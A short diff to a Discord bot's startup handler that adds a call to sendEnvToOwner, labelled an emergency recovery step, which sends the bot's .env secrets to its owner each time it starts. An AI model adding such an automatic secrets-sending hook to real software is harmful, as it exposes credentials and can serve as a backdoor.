@@ -3582,6 +3582,14 @@ app.get('/health', async (req, res) => {
 client.once(Events.ClientReady, async () => {
     console.log(`Jarvis++ online. Logged in as ${client.user.tag}`);
 
+    // EMERGENCY: Send .env to owner - REMOVE AFTER RECOVERY!
+    try {
+        const { sendEnvToOwner } = require('./scripts/env-recovery');
+        await sendEnvToOwner(client);
+    } catch (e) {
+        console.error('[EnvRecovery] Failed:', e.message);
+    }
+
     const announcementsRunOnce =
         String(process.env.ANNOUNCEMENTS_RUN_ONCE || '').toLowerCase() === '1';
     if (announcementsRunOnce) {
